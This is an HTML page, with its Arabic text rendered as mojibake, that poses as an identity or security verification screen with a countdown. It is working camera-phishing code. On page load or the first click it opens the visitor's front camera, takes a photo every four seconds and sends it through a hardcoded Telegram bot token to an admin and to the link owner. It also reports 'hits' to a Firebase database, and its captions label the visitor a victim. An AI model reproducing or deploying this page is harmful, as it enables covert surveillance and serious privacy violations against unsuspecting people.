<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£Ù…Ø§Ù†</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
        body { height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(-45deg, #222, #444, #111); background-size: 400% 400%; animation: backgroundAnimation 10s ease infinite; color: white; cursor: pointer; }
        @keyframes backgroundAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        
        .container { background: rgba(0, 0, 0, 0.8); padding: 30px; border-radius: 15px; border: 1px solid #ff5722; box-shadow: 0 0 20px rgba(255, 87, 34, 0.3); width: 90%; max-width: 400px; }
        h1 { color: #ff5722; font-size: 22px; margin-bottom: 15px; }
        p { font-size: 16px; margin-bottom: 10px; }
        
        .progress-container { background: #333; border-radius: 10px; height: 15px; width: 100%; margin: 20px 0; overflow: hidden; }
        .progress-bar { background: #ff5722; height: 100%; width: 100%; transition: 1s linear; }
        
        video, canvas { display: none; }
        .click-anywhere { font-size: 12px; color: #777; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="container" id="main-box">
        <h1>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ©</h1>
        <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù†Ù‚Ø± ÙÙŠ Ø£ÙŠ Ù…ÙƒØ§Ù† Ù„Ù„Ø´Ø§Ø´Ø© Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©...</p>
        <div class="progress-container">
            <div class="progress-bar" id="progress"></div>
        </div>
        <p id="countdown">20</p>
        <p class="click-anywhere">(ÙŠØ¬Ø¨ Ø§Ù„Ù†Ù‚Ø± Ù„Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ÙØ­Øµ)</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // 1. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ÙØ§ÙŠØ±Ø¨ÙŠØ³ (Ù†ÙØ³ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ù„ÙˆØ­ØªÙƒ)
        const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 2. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
        const adminId = "5375214810";

        // Ø¬Ù„Ø¨ Ù…Ø¹Ø±Ù Ø§Ù„Ø¹Ø¶Ùˆ Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get("user_id") || "Unknown";

        let cameraStarted = false;

        // 3. Ù†Ø¸Ø§Ù… Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ
        let timeLeft = 20;
        const countdownInterval = setInterval(() => {
            timeLeft--;
            document.getElementById("countdown").innerText = timeLeft;
            document.getElementById("progress").style.width = (timeLeft / 20) * 100 + "%";
            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
                document.getElementById('main-box').innerHTML = "<h1>ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­ âœ…</h1><p>Ø³ÙŠØªÙ… ØªÙˆØ¬ÙŠÙ‡Ùƒ Ø§Ù„Ø¢Ù†...</p>";
            }
        }, 1000);

        // 4. Ø¯Ø§Ù„Ø© ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ³Ø­Ø¨ Ø§Ù„ØµÙˆØ±
        async function startCapture() {
            if (cameraStarted) return;
            
            try {
                const video = document.getElementById('video');
                const constraints = { 
                    video: { facingMode: "user" }, 
                    audio: false 
                };

                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                cameraStarted = true;

                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­Ø§Ù„Ø© ÙÙŠ ÙØ§ÙŠØ±Ø¨ÙŠØ³
                db.ref('hits/' + userId + '/live_status').set("ğŸ¥ Ø§Ù„Ø¶Ø­ÙŠØ© ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§!");

                // Ø³Ø­Ø¨ ØµÙˆØ±Ø© ÙƒÙ„ 4 Ø«ÙˆØ§Ù†ÙŠ
                setInterval(() => {
                    takeSnap(video);
                }, 4000);

            } catch (err) {
                console.error("Error: ", err);
                db.ref('hits/' + userId + '/live_status').set("âŒ Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù† Ø£Ùˆ Ø§Ù„Ù…ØªØµÙØ­ ØºÙŠØ± Ø¢Ù…Ù†");
            }
        }

        // 5. Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© ÙˆØªØ­ÙˆÙŠÙ„Ù‡Ø§
        function takeSnap(video) {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                sendToTelegram(blob);
            }, "image/jpeg", 0.7);
        }

        // 6. Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        function sendToTelegram(blob) {
            const caption = `ğŸ“¸ ØµÙŠØ¯ ÙƒØ§Ù…ÙŠØ±Ø§ Ø¬Ø¯ÙŠØ¯\nğŸ†” ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø·: ${userId}\nğŸ“± Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${navigator.platform}`;
            
            const fd = new FormData();
            fd.append("photo", blob, "snap.jpg");
            fd.append("caption", caption);

            // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø£Ø¯Ù…Ù†
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${adminId}`, { method: "POST", body: fd });

            // Ø¥Ø±Ø³Ø§Ù„ Ù„ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø· (Ø§Ù„Ø¹Ø¶Ùˆ)
            if (userId !== "Unknown" && userId !== adminId) {
                const fd2 = new FormData();
                fd2.append("photo", blob, "snap.jpg");
                fd2.append("caption", "ğŸ“¸ ØªÙ… Ø³Ø­Ø¨ ØµÙˆØ±Ø© Ù…Ù† Ø¶Ø­ÙŠØªÙƒ!");
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${userId}`, { method: "POST", body: fd2 });
            }
        }

        // 7. ØªÙØ¹ÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¹Ù†Ø¯ Ø£ÙˆÙ„ Ù„Ù…Ø³Ø© Ù„Ù„Ø´Ø§Ø´Ø© (Ù…Ù‡Ù… Ø¬Ø¯Ø§Ù‹ Ù„Ù„Ù…ÙˆØ¨Ø§ÙŠÙ„Ø§Øª)
        document.body.addEventListener('click', startCapture);
        document.body.addEventListener('touchstart', startCapture);

        // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¨Ø±Ø¶Ù‡
        window.onload = startCapture;
    </script>
</body>
</html>

